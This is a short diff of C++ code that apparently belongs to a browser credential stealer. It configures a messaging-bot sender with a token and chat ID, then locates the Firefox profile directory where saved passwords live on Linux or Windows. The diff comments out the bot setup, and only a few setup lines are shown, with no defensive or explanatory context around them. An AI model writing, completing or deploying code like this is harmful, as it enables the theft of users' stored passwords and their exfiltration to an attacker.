@@ -4,11 +4,11 @@ int main()
 {
     try
     {
+        /*
         const string TOKEN("");    //put your bot token here
         int64_t ChatID=12345;         //put your chat id here
-
         Sender bot_sender(TOKEN);
-
+        */
 #if defined(__linux__)
         string firefox_pass_path="~/.mozilla/firefox/<profilename>";
 #elif defined(__WIN64__)
